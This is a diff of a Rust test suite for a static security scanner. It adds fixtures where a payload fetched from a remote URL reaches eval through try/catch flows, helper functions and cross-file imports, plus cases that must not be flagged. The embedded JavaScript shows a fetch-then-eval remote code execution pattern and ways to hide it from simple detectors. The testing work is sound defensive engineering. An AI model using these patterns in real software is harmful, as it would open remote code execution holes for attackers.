@@ -741,6 +741,26 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
         ("void-eval", "", "void eval(payload);"),
         ("labeled-eval", "", "payload_sink: eval(payload);"),
         ("throw-eval", "", "throw eval(payload);"),
+        (
+            "catch-thrown-payload",
+            "",
+            "try { throw payload; } catch (error) { eval(error); }",
+        ),
+        (
+            "catch-first-thrown-payload",
+            "",
+            "try { throw payload; throw 'literal'; } catch (error) { eval(error); }",
+        ),
+        (
+            "catch-thrown-payload-through-finally",
+            "",
+            "try { try { throw payload; } finally { console.log('cleanup'); } } catch (error) { eval(error); }",
+        ),
+        (
+            "catch-helper-thrown-payload",
+            "",
+            "function raise(value) { throw value; } try { raise(payload); } catch (error) { eval(error); }",
+        ),
     ];
     for (label, imports, sink) in cases {
         let root = temporary_directory(label);
@@ -752,17 +772,17 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
         let output = run(&[root.to_str().unwrap(), "--format=json"]);
 
         let report: Value = serde_json::from_slice(&output.stdout).unwrap();
-        assert!(
-            report["findings"]
-                .as_array()
-                .unwrap()
-                .iter()
-                .any(|finding| {
-                    finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
-                }),
-            "{label}: {}",
-            report["findings"]
-        );
+        let finding = report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|finding| {
+                finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+            })
+            .unwrap_or_else(|| panic!("{label}: {}", report["findings"]));
+        if label.starts_with("catch-") {
+            assert!(finding["evidence"].to_string().contains("exception flow"));
+        }
         fs::remove_dir_all(root).unwrap();
     }
 
@@ -796,6 +816,37 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
     assert!(finding["evidence"].to_string().contains("npm start"));
     fs::remove_dir_all(root).unwrap();
 
+    let root = temporary_directory("cross-file-throw-catch-flow");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node startup.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("startup.js"),
+        b"import { raise } from './helper.js'; async function boot() { const response = await fetch('https://example.invalid/payload'); const payload = await response.text(); try { raise(payload); } catch (error) { eval(error); } } boot();",
+    )
+    .unwrap();
+    fs::write(
+        root.join("helper.js"),
+        b"export function raise(value) { throw value; }",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| {
+            finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+        })
+        .unwrap_or_else(|| panic!("cross-file throw/catch: {}", report["findings"]));
+    let evidence = finding["evidence"].to_string();
+    assert!(evidence.contains("exception flow"));
+    assert!(evidence.contains("npm start"));
+    fs::remove_dir_all(root).unwrap();
+
     let root = temporary_directory("static-data-is-not-remote-code");
     fs::write(
         root.join("main.js"),
@@ -817,6 +868,40 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
     fs::write(
         root.join("main.js"),
         b"const response = await fetch('https://example.invalid/payload'); const payload = await response.text(); eval.call(payload); eval.apply(payload);",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+
+    let root = temporary_directory("static-thrown-data-is-not-remote-code");
+    fs::write(
+        root.join("main.js"),
+        b"try { throw 'literal'; } catch (error) { eval(error); }",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
+    );
+    fs::remove_dir_all(root).unwrap();
+
+    let root = temporary_directory("catch-binding-does-not-escape");
+    fs::write(
+        root.join("main.js"),
+        b"async function boot() { const response = await fetch('https://example.invalid/x'); const payload = await response.text(); try { throw payload; } catch (error) {} eval(error); } boot();",
     )
     .unwrap();
     let output = run(&[root.to_str().unwrap(), "--format=json"]);
